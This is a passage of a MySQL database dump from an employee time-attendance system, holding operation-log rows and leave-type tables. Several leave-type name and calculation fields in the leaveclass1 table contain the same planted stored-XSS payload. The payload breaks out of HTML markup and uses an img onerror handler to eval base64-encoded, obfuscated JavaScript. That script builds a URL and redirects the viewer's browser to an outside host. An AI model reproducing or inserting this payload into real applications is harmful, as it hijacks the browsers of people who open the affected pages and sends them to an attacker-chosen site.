17:01:33',0,0,0,0),(70,'A3AG223160114',0,4,'2022-11-09 17:06:46',0,0,0,0),(71,'A3AG223160114',0,4,'2022-11-09 17:07:36',0,0,0,0),(72,'A3AG223160114',0,4,'2022-11-09 17:10:03',0,0,0,0),(73,'A3AG223160114',0,0,'2022-11-09 17:11:13',0,0,0,0),(74,'A3AG223160114',0,3,'2022-11-09 17:11:14',55,0,0,0),(75,'A3AG223160114',0,0,'2022-11-10 09:22:26',0,0,0,0),(76,'A3AG223160114',0,3,'2022-11-10 09:22:27',55,0,0,0),(77,'A3AG223160114',0,4,'2022-11-10 09:23:29',0,0,0,0),(78,'A3AG223160114',0,4,'2022-11-10 11:09:26',0,0,0,0),(79,'A3AG223160114',0,0,'2022-11-10 11:10:34',0,0,0,0),(80,'A3AG223160114',0,3,'2022-11-10 11:10:36',55,0,0,0),(81,'A3AG223160114',0,0,'2022-11-10 11:13:41',0,0,0,0),(82,'A3AG223160114',0,3,'2022-11-10 11:13:42',55,0,0,0),(83,'A3AG223160114',0,4,'2022-11-10 11:28:25',0,0,0,0),(84,'A3AG223160114',0,4,'2022-11-10 11:29:16',0,3002,0,0),(85,'A3AG223160114',0,4,'2022-11-10 11:29:18',0,3006,0,0),(86,'A3AG223160114',0,7,'2022-11-10 11:31:34',1,0,0,0),(87,'A3AG223160114',0,30,'2022-11-10 11:31:35',1,0,0,0),(88,'A3AG223160114',0,0,'2022-11-10 11:32:56',0,0,0,0),(89,'A3AG223160114',0,3,'2022-11-10 11:32:59',55,0,0,0),(90,'A3AG223160114',0,4,'2022-11-10 13:06:17',0,0,0,0),(91,'A3AG223160114',0,70,'2022-11-10 13:06:55',2,0,0,0),(92,'A3AG223160114',0,30,'2022-11-10 13:08:05',2,0,0,0),(93,'A3AG223160114',0,6,'2022-11-10 13:08:07',2,0,0,0),(94,'A3AG223160114',0,4,'2022-11-14 18:24:42',0,0,0,0),(95,'A3AG223160114',0,4,'2022-11-14 18:26:46',0,0,0,0),(96,'A3AG223160114',0,4,'2022-11-14 18:27:55',0,0,0,0),(97,'A3AG223160114',0,70,'2022-11-14 18:28:17',3,0,0,0),(98,'A3AG223160114',0,30,'2022-11-14 18:29:12',3,0,0,0),(99,'A3AG223160114',0,6,'2022-11-14 18:29:14',3,0,0,0),(100,'A3AG223160114',0,4,'2022-11-14 18:29:54',0,0,0,0),(101,'A3AG223160114',0,4,'2022-11-14 18:32:34',0,0,0,0),(102,'A3AG223160114',0,4,'2022-11-15 10:28:23',0,0,0,0),(103,'A3AG223160114',0,4,'2022-11-18 15:49:25',0,0,0,0),(104,'A3AG223160114',0,4,'2022-11-20 01:05:14',0,0,0,0),(105,'A3AG223160114',0,4,'2022-11-20 01:08:08',0,0,0,0),(106,'A3AG223160114',0,4,'2022-11-20 01:09:26',0,3002,0,0),(107,'A3AG223160114',0,4,'2022-11-20 01:09:29',0,3006,0,0),(108,'A3AG223160114',0,4,'2022-11-21 01:54:47',0,0,0,0),(109,'A3AG223160114',0,4,'2022-11-21 01:57:55',0,0,0,0),(110,'A3AG223160114',0,4,'2022-11-21 02:04:21',0,0,0,0),(111,'A3AG223160114',0,0,'2022-11-22 16:26:36',0,0,0,0),(112,'A3AG223160114',0,3,'2022-11-22 16:26:37',55,0,0,0),(113,'A3AG223160114',0,4,'2022-11-22 16:27:08',0,0,0,0),(114,'A3AG223160114',0,4,'2022-11-22 16:28:56',0,0,0,0),(115,'A3AG223160114',0,4,'2022-11-22 16:29:15',0,0,0,0),(116,'A3AG223160114',0,0,'2022-11-29 20:45:55',0,0,0,0),(117,'A3AG223160114',0,3,'2022-11-29 20:45:58',55,0,0,0),(118,'A3AG223160114',0,4,'2022-11-29 20:46:13',0,0,0,0),(119,'A3AG223160114',0,4,'2022-11-29 20:46:23',0,0,0,0),(120,'A3AG223160114',0,4,'2022-11-29 20:57:56',0,0,0,0),(121,'A3AG223160114',0,0,'2022-11-29 20:59:14',0,0,0,0),(122,'A3AG223160114',0,3,'2022-11-29 20:59:15',55,0,0,0),(123,'A3AG223160114',0,4,'2022-11-29 20:59:29',0,0,0,0),(124,'A3AG223160114',0,4,'2022-11-29 21:21:32',0,0,0,0),(125,'A3AG223160114',0,4,'2022-11-29 21:23:58',0,0,0,0),(126,'A3AG223160114',0,4,'2022-11-29 21:26:14',0,0,0,0),(127,'A3AG223160114',0,4,'2022-11-29 21:32:03',0,0,0,0),(128,'A3AG223160114',0,70,'2022-11-29 21:32:36',4,0,0,0),(129,'A3AG223160114',0,30,'2022-11-29 21:33:06',4,0,0,0),(130,'A3AG223160114',0,4,'2022-11-29 21:50:29',0,0,0,0),(131,'A3AG223160114',0,4,'2022-11-29 21:58:31',0,0,0,0),(132,'A3AG223160114',0,4,'2022-11-29 22:08:57',0,0,0,0),(133,'A3AG223160114',0,4,'2022-11-29 22:26:10',0,0,0,0),(134,'A3AG223160114',0,4,'2022-11-29 22:35:58',0,0,0,0),(135,'A3AG223160114',0,0,'2022-11-30 09:49:58',0,0,0,0),(136,'A3AG223160114',0,3,'2022-11-30 09:50:00',55,0,0,0),(137,'A3AG223160114',0,4,'2022-11-30 09:50:08',0,0,0,0),(138,'A3AG223160114',0,4,'2022-11-30 10:27:25',0,0,0,0),(139,'A3AG223160114',0,4,'2022-11-30 10:37:33',0,0,0,0),(140,'A3AG223160114',0,4,'2022-11-30 10:39:31',0,0,0,0),(141,'A3AG223160114',0,36,'2022-11-30 10:42:48',3,0,0,0),(142,'A3AG223160114',0,0,'2000-02-01 01:01:10',0,0,0,0),(143,'A3AG223160114',0,3,'2000-02-01 01:01:15',55,0,0,0),(144,'A3AG223160114',0,0,'2022-08-01 16:22:47',0,0,0,0),(145,'A3AG223160114',0,3,'2022-08-01 16:22:50',55,0,0,0),(146,'A3AG223160114',0,0,'2022-08-01 16:24:55',0,0,0,0),(147,'A3AG223160114',0,3,'2022-08-01 16:24:58',55,0,0,0),(148,'A3AG223160114',0,3,'2022-08-01 16:26:27',53,0,0,0),(149,'A3AG223160114',0,4,'2022-08-01 16:26:43',0,0,0,0),(150,'A3AG223160114',0,0,'2022-11-07 16:38:45',0,0,0,0),(151,'A3AG223160114',0,3,'2022-11-07 16:38:46',55,0,0,0),(152,'A3AG223160114',0,4,'2022-11-07 16:38:50',0,0,0,0),(153,'A3AG223160114',0,4,'2022-11-07 16:41:04',0,0,0,0),(154,'A3AG223160114',0,4,'2022-11-07 16:47:32',0,0,0,0),(155,'A3AG223160114',0,0,'2022-11-08 20:34:41',0,0,0,0),(156,'A3AG223160114',0,3,'2022-11-08 20:34:44',55,0,0,0),(157,'A3AG223160114',0,4,'2022-11-08 20:34:45',0,0,0,0),(158,'A3AG223160114',0,4,'2022-11-08 20:39:10',0,0,0,0),(159,'A3AG223160114',0,4,'2022-11-08 20:41:21',0,0,0,0),(160,'A3AG223160114',0,0,'2022-11-08 20:45:02',0,0,0,0),(161,'A3AG223160114',0,3,'2022-11-08 20:45:05',55,0,0,0),(162,'A3AG223160114',0,4,'2022-11-08 20:45:07',0,0,0,0),(163,'A3AG223160114',0,0,'2022-11-09 14:19:45',0,0,0,0),(164,'A3AG223160114',0,3,'2022-11-09 14:19:48',55,0,0,0),(165,'A3AG223160114',0,4,'2022-11-09 14:19:50',0,0,0,0),(166,'A3AG223160114',0,4,'2022-11-09 14:33:32',0,0,0,0),(167,'A3AG223160114',0,4,'2022-11-09 14:34:23',0,3002,0,0),(168,'A3AG223160114',0,4,'2022-11-09 14:34:26',0,3006,0,0),(169,'A3AG223160114',0,4,'2022-11-09 14:41:40',0,0,0,0),(170,'A3AG223160114',0,4,'2022-11-09 14:42:52',0,0,0,0),(171,'A3AG223160114',0,4,'2022-11-09 14:50:11',0,0,0,0),(172,'A3AG223160114',0,0,'2022-11-09 14:54:08',0,0,0,0),(173,'A3AG223160114',0,3,'2022-11-09 14:54:10',55,0,0,0),(174,'A3AG223160114',0,4,'2022-11-09 14:55:12',0,0,0,0),(175,'A3AG223160114',0,0,'2022-11-09 14:56:47',0,0,0,0),(176,'A3AG223160114',0,3,'2022-11-09 14:56:50',55,0,0,0),(177,'A3AG223160114',0,4,'2022-11-09 14:58:39',0,0,0,0),(178,'A3AG223160114',0,4,'2022-11-09 15:00:18',0,0,0,0),(179,'A3AG223160114',0,4,'2022-11-09 15:03:51',0,0,0,0),(180,'A3AG223160114',0,4,'2022-11-09 15:12:43',0,0,0,0),(181,'A3AG223160114',0,4,'2022-11-09 15:15:04',0,0,0,0),(182,'A3AG223160114',0,4,'2022-11-09 15:22:59',0,0,0,0),(183,'A3AG223160114',0,0,'2022-11-09 15:45:05',0,0,0,0),(184,'A3AG223160114',0,3,'2022-11-09 15:45:08',55,0,0,0),(185,'A3AG223160114',0,4,'2022-11-09 15:45:11',0,0,0,0),(186,'A3AG223160114',0,4,'2022-11-09 15:45:46',0,0,0,0),(187,'A3AG223160114',0,4,'2022-11-09 15:46:20',0,0,0,0),(188,'A3AG223160114',0,0,'2022-11-09 16:55:17',0,0,0,0),(189,'A3AG223160114',0,3,'2022-11-09 16:55:18',55,0,0,0),(190,'A3AG223160114',0,4,'2022-11-09 16:56:54',0,0,0,0),(191,'A3AG223160114',0,4,'2022-11-09 17:00:59',0,0,0,0),(192,'A3AG223160114',0,4,'2022-11-09 17:25:27',0,0,0,0),(193,'A3AG223160114',0,4,'2022-11-09 17:26:57',0,0,0,0),(194,'A3AG223160114',0,4,'2022-11-09 17:28:18',0,0,0,0),(195,'A3AG223160114',0,4,'2022-11-09 17:43:52',0,0,0,0),(196,'A3AG223160114',0,4,'2022-11-09 17:44:19',0,3002,0,0),(197,'A3AG223160114',0,4,'2022-11-09 17:44:21',0,3006,0,0),(198,'A3AG223160114',0,0,'2022-11-09 17:47:42',0,0,0,0),(199,'A3AG223160114',0,4,'2022-11-09 17:47:49',0,0,0,0),(200,'A3AG223160114',0,4,'2022-11-09 17:49:59',0,0,0,0),(201,'A3AG223160114',0,4,'2022-11-09 17:50:11',0,0,0,0),(202,'A3AG223160114',0,0,'2022-11-09 17:50:56',0,0,0,0),(203,'A3AG223160114',0,3,'2022-11-09 17:50:57',55,0,0,0),(204,'A3AG223160114',0,4,'2022-11-09 17:50:59',0,0,0,0),(205,'A3AG223160114',0,4,'2022-11-09 17:52:42',0,0,0,0),(206,'A3AG223160114',0,4,'2022-11-09 17:54:13',0,0,0,0),(207,'A3AG223160114',0,4,'2022-11-09 17:55:26',0,0,0,0),(208,'A3AG223160114',0,4,'2022-11-09 17:59:26',0,0,0,0),(209,'A3AG223160114',0,4,'2022-11-09 18:00:07',0,0,0,0),(210,'A3AG223160114',0,4,'2022-11-09 18:01:33',0,0,0,0),(211,'A3AG223160114',0,4,'2022-11-09 18:06:46',0,0,0,0),(212,'A3AG223160114',0,4,'2022-11-09 18:07:36',0,0,0,0),(213,'A3AG223160114',0,4,'2022-11-09 18:10:03',0,0,0,0),(214,'A3AG223160114',0,0,'2022-11-09 18:11:13',0,0,0,0),(215,'A3AG223160114',0,3,'2022-11-09 18:11:14',55,0,0,0),(216,'A3AG223160114',0,0,'2022-11-10 10:22:26',0,0,0,0),(217,'A3AG223160114',0,3,'2022-11-10 10:22:27',55,0,0,0),(218,'A3AG223160114',0,4,'2022-11-10 10:23:29',0,0,0,0),(219,'A3AG223160114',0,4,'2022-11-10 12:09:26',0,0,0,0),(220,'A3AG223160114',0,0,'2022-11-10 12:10:34',0,0,0,0),(221,'A3AG223160114',0,3,'2022-11-10 12:10:36',55,0,0,0),(222,'A3AG223160114',0,0,'2022-11-10 12:13:41',0,0,0,0),(223,'A3AG223160114',0,3,'2022-11-10 12:13:42',55,0,0,0),(224,'A3AG223160114',0,4,'2022-11-10 12:28:25',0,0,0,0),(225,'A3AG223160114',0,4,'2022-11-10 12:29:16',0,3002,0,0),(226,'A3AG223160114',0,4,'2022-11-10 12:29:18',0,3006,0,0),(227,'A3AG223160114',0,7,'2022-11-10 12:31:34',1,0,0,0),(228,'A3AG223160114',0,30,'2022-11-10 12:31:35',1,0,0,0),(229,'A3AG223160114',0,0,'2022-11-10 12:32:56',0,0,0,0),(230,'A3AG223160114',0,3,'2022-11-10 12:32:59',55,0,0,0),(231,'A3AG223160114',0,4,'2022-11-10 14:06:17',0,0,0,0),(232,'A3AG223160114',0,70,'2022-11-10 14:06:55',2,0,0,0),(233,'A3AG223160114',0,30,'2022-11-10 14:08:05',2,0,0,0),(234,'A3AG223160114',0,6,'2022-11-10 14:08:07',2,0,0,0),(235,'A3AG223160114',0,4,'2022-11-14 19:24:42',0,0,0,0),(236,'A3AG223160114',0,4,'2022-11-14 19:26:46',0,0,0,0),(237,'A3AG223160114',0,4,'2022-11-14 19:27:55',0,0,0,0),(238,'A3AG223160114',0,70,'2022-11-14 19:28:17',3,0,0,0),(239,'A3AG223160114',0,30,'2022-11-14 19:29:12',3,0,0,0),(240,'A3AG223160114',0,6,'2022-11-14 19:29:14',3,0,0,0),(241,'A3AG223160114',0,4,'2022-11-14 19:29:54',0,0,0,0),(242,'A3AG223160114',0,4,'2022-11-14 19:32:34',0,0,0,0),(243,'A3AG223160114',0,4,'2022-11-15 11:28:23',0,0,0,0),(244,'A3AG223160114',0,4,'2022-11-18 16:49:25',0,0,0,0),(245,'A3AG223160114',0,4,'2022-11-20 02:05:14',0,0,0,0),(246,'A3AG223160114',0,4,'2022-11-20 02:08:08',0,0,0,0),(247,'A3AG223160114',0,4,'2022-11-20 02:09:26',0,3002,0,0),(248,'A3AG223160114',0,4,'2022-11-20 02:09:29',0,3006,0,0),(249,'A3AG223160114',0,4,'2022-11-21 02:54:47',0,0,0,0),(250,'A3AG223160114',0,4,'2022-11-21 02:57:55',0,0,0,0),(251,'A3AG223160114',0,4,'2022-11-21 03:04:21',0,0,0,0),(252,'A3AG223160114',0,0,'2022-11-22 17:26:36',0,0,0,0),(253,'A3AG223160114',0,3,'2022-11-22 17:26:37',55,0,0,0),(254,'A3AG223160114',0,4,'2022-11-22 17:27:08',0,0,0,0),(255,'A3AG223160114',0,4,'2022-11-22 17:28:56',0,0,0,0),(256,'A3AG223160114',0,4,'2022-11-22 17:29:15',0,0,0,0),(257,'A3AG223160114',0,0,'2022-11-29 21:45:55',0,0,0,0),(258,'A3AG223160114',0,3,'2022-11-29 21:45:58',55,0,0,0),(259,'A3AG223160114',0,4,'2022-11-29 21:46:13',0,0,0,0),(260,'A3AG223160114',0,4,'2022-11-29 21:46:23',0,0,0,0),(261,'A3AG223160114',0,4,'2022-11-29 21:57:56',0,0,0,0),(262,'A3AG223160114',0,0,'2022-11-29 21:59:14',0,0,0,0),(263,'A3AG223160114',0,3,'2022-11-29 21:59:15',55,0,0,0),(264,'A3AG223160114',0,4,'2022-11-29 21:59:29',0,0,0,0),(265,'A3AG223160114',0,4,'2022-11-29 22:21:32',0,0,0,0),(266,'A3AG223160114',0,4,'2022-11-29 22:23:58',0,0,0,0),(267,'A3AG223160114',0,4,'2022-11-29 22:26:14',0,0,0,0),(268,'A3AG223160114',0,4,'2022-11-29 22:32:03',0,0,0,0),(269,'A3AG223160114',0,70,'2022-11-29 22:32:36',4,0,0,0),(270,'A3AG223160114',0,30,'2022-11-29 22:33:06',4,0,0,0),(271,'A3AG223160114',0,4,'2022-11-29 22:50:29',0,0,0,0),(272,'A3AG223160114',0,4,'2022-11-29 22:58:31',0,0,0,0),(273,'A3AG223160114',0,4,'2022-11-29 23:08:57',0,0,0,0),(274,'A3AG223160114',0,4,'2022-11-29 23:26:10',0,0,0,0),(275,'A3AG223160114',0,4,'2022-11-29 23:35:58',0,0,0,0),(276,'A3AG223160114',0,4,'2022-11-30 10:47:12',0,0,0,0),(277,'A3AG223160114',0,70,'2022-11-30 10:47:32',5,0,0,0),(278,'A3AG223160114',0,30,'2022-11-30 10:48:06',5,0,0,0),(279,'A3AG223160114',0,6,'2022-11-30 10:48:10',5,0,0,0),(280,'A3AG223160114',0,0,'2022-11-30 11:00:17',0,0,0,0),(281,'A3AG223160114',0,3,'2022-11-30 11:00:20',55,0,0,0),(282,'A3AG223160114',0,0,'2022-11-30 13:10:06',0,0,0,0),(283,'A3AG223160114',0,3,'2022-11-30 13:10:09',55,0,0,0),(284,'A3AG223160114',0,4,'2022-11-30 13:10:12',0,0,0,0),(285,'A3AG223160114',0,4,'2022-11-30 13:25:46',0,0,0,0),(286,'A3AG223160114',0,0,'2022-11-30 13:29:26',0,0,0,0),(287,'A3AG223160114',0,3,'2022-11-30 13:29:28',55,0,0,0),(288,'A3AG223160114',0,4,'2022-11-30 13:29:33',0,0,0,0),(289,'A3AG223160114',0,4,'2022-11-30 13:50:54',0,0,0,0),(290,'A3AG223160114',0,70,'2022-11-30 13:51:58',6,0,0,0),(291,'A3AG223160114',0,30,'2022-11-30 13:52:39',6,0,0,0),(292,'A3AG223160114',0,6,'2022-11-30 13:52:40',6,0,0,0),(293,'A3AG223160114',0,4,'2022-12-01 00:22:43',0,0,0,0),(294,'A3AG223160114',0,0,'2022-11-30 17:33:15',0,0,0,0),(295,'A3AG223160114',0,3,'2022-11-30 17:33:16',55,0,0,0),(296,'A3AG223160114',0,4,'2022-11-30 17:34:52',0,0,0,0),(297,'A3AG223160114',0,0,'2022-12-01 00:22:04',0,0,0,0),(298,'A3AG223160114',0,3,'2022-12-01 00:22:06',55,0,0,0),(299,'A3AG223160114',0,70,'2022-12-01 00:26:47',7,0,0,0),(300,'A3AG223160114',0,30,'2022-12-01 00:27:19',7,0,0,0),(301,'A3AG223160114',0,6,'2022-12-01 00:27:22',7,0,0,0),(302,'A3AG223160114',0,4,'2022-12-01 00:31:10',0,0,0,0),(303,'A3AG223160114',0,0,'2022-12-01 03:13:33',0,0,0,0),(304,'A3AG223160114',0,3,'2022-12-01 03:13:35',55,0,0,0),(305,'A3AG223160114',0,4,'2022-12-01 03:48:21',0,0,0,0),(306,'A3AG223160114',0,4,'2022-12-01 03:49:24',0,0,0,0),(307,'A3AG223160114',0,0,'2022-12-01 09:42:49',0,0,0,0),(308,'A3AG223160114',0,3,'2022-12-01 09:42:50',55,0,0,0),(309,'A3AG223160114',0,4,'2022-12-01 13:37:05',0,0,0,0),(310,'A3AG223160114',0,4,'2022-12-01 14:28:36',0,0,0,0),(311,'A3AG223160114',0,70,'2022-12-01 14:28:51',8,0,0,0),(312,'A3AG223160114',0,30,'2022-12-01 14:29:17',8,0,0,0),(313,'A3AG223160114',0,6,'2022-12-01 14:29:18',8,0,0,0);
/*!40000 ALTER TABLE `iclock_oplog` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `iclock_scheduletask`
--

DROP TABLE IF EXISTS `iclock_scheduletask`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `iclock_scheduletask` (
  `schName` varchar(100) NOT NULL,
  `startup` datetime NOT NULL,
  `cycle` int(11) DEFAULT NULL,
  `cycleUnit` smallint(6) NOT NULL,
  `taskType` smallint(6) NOT NULL,
  `taskParam` varchar(1024) DEFAULT NULL,
  `disabled` smallint(6) NOT NULL,
  PRIMARY KEY (`schName`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `iclock_scheduletask`
--

LOCK TABLES `iclock_scheduletask` WRITE;
/*!40000 ALTER TABLE `iclock_scheduletask` DISABLE KEYS */;
/*!40000 ALTER TABLE `iclock_scheduletask` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `leaveclass`
--

DROP TABLE IF EXISTS `leaveclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `leaveclass` (
  `LeaveID` int(11) NOT NULL AUTO_INCREMENT,
  `LeaveName` varchar(20) NOT NULL,
  `MinUnit` varchar(900) DEFAULT NULL,
  `Unit` smallint(6) NOT NULL,
  `RemaindProc` smallint(6) NOT NULL,
  `RemaindCount` smallint(6) NOT NULL,
  `ReportSymbol` varchar(4) NOT NULL,
  `Deduct` varchar(900) DEFAULT NULL,
  `Color` int(11) DEFAULT NULL,
  `Classify` smallint(6) NOT NULL,
  PRIMARY KEY (`LeaveID`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `leaveclass`
--

LOCK TABLES `leaveclass` WRITE;
/*!40000 ALTER TABLE `leaveclass` DISABLE KEYS */;
INSERT INTO `leaveclass` VALUES (1,'Sick leave','1',1,1,1,'B','0',3398744,0),(2,'Private affair leave','1',1,1,1,'S','0',8421631,0),(3,'Home leave','1',1,1,1,'T','0',16744576,0);
/*!40000 ALTER TABLE `leaveclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `leaveclass1`
--

DROP TABLE IF EXISTS `leaveclass1`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `leaveclass1` (
  `LeaveID` int(11) NOT NULL,
  `LeaveName` varchar(20) NOT NULL,
  `MinUnit` varchar(900) DEFAULT NULL,
  `Unit` smallint(6) NOT NULL,
  `RemaindProc` smallint(6) NOT NULL,
  `RemaindCount` smallint(6) NOT NULL,
  `ReportSymbol` varchar(4) NOT NULL,
  `Deduct` varchar(900) DEFAULT NULL,
  `Color` int(11) NOT NULL,
  `Classify` smallint(6) NOT NULL,
  `LeaveType` smallint(6) NOT NULL,
  `Calc` varchar(900) DEFAULT NULL,
  PRIMARY KEY (`LeaveID`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `leaveclass1`
--

LOCK TABLES `leaveclass1` WRITE;
/*!40000 ALTER TABLE `leaveclass1` DISABLE KEYS */;
INSERT INTO `leaveclass1` VALUES (999,'BL','\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>',3,1,1,'G','0',0,0,3,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>'),(1000,'OK','\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>',3,1,0,' ','0',0,0,3,NULL),(1001,'Late','10',2,2,1,'>','0',0,0,3,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>'),(1002,'Early','10',2,2,1,'<','0',0,0,3,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>'),(1003,'ALF','1',1,1,1,'V','0',0,0,3,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>'),(1004,'Absent','\'\"></title></a><img src=\"0\" 